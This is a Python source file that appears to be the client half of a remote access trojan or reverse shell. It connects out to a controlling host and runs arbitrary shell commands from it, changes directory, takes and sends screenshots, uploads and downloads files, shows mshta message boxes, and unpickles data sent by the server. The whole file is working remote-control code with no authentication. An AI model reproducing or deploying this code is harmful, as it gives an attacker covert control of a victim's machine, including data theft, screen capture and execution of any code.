import os, socket, subprocess, sys
from message import Message
import pickle
import pyscreenshot

class Client():
    def __init__(self, shost, sport):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.s.connect((shost, sport))
            self.communicate()
        except:
            print('Failed to connect to host server')


    def receive(self):
        msg = Message(self.s.recv(1024),2) #1024 is buffer size
        size = msg.get_size()
        print(size)
        data = msg.utf
        while len(data) < size:
            data += Message(self.s.recv(1024),1).utf
        return data


    def receive_binary(self):
        msg = Message(self.s.recv(1024),2) #1024 is buffer size
        size = msg.get_size()
        print(size)
        data = msg.bin
        while len(data) < size:
            data += Message(self.s.recv(1024),1).bin
            print(size - len(data), 'left')
        return data

    def receive_object(self):
        binary_obj = self.receive_binary()
        return pickle.loads(binary_obj)


    def save_file(self, name, content):
        with open(name, 'wb') as file:
            file.write(content)

    def send_file(self,location):
        with open(location, 'rb') as file:
            return Message(file.read(), 1)

    def send_object(self, object):
        bin = pickle.dumps(object)
        return Message(bin, 1)

    def screenshot(self):
        return pyscreenshot.grab()

    def communicate(self):
        while True:
            data = self.receive()
            if data[:2] == 'cd':
                try:
                    os.chdir(data[3:])
                    self.s.send(Message('directory changed succesfully\n'+str(os.getcwd()) + '> ',0).message)
                except:
                    self.s.send(Message('error executing the command',0).message)
            elif data == 'quit':
                    sys.exit()
            elif data =='screenshot':
                img = self.send_object(self.screenshot())
                self.s.send(img.message)
                print('screenshot sent')
            elif data[:8] == 'incoming':
                name = data[9:].strip()
                content = self.receive_binary()
                self.save_file(name, content)
                self.s.send(Message('file received succesfully!', 0).message)
            elif data[:8] == 'download':
                location = data[9:]
                print(location, 'is uploading')
                self.s.send(self.send_file(location).message)
            elif data[:5] == 'alert':
                print('alert received')
                alert_msg = data[6:]
                os.system(f'''mshta vbscript:Execute("msgbox ""{alert_msg}"":close")''')
            elif len(data) > 0:
                cmd = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                output = Message(cmd.stdout.read() + cmd.stderr.read(), 1)
                print(output.utf)
                self.s.send(Message(output.utf + str(os.getcwd()) + '> ', 0).message)
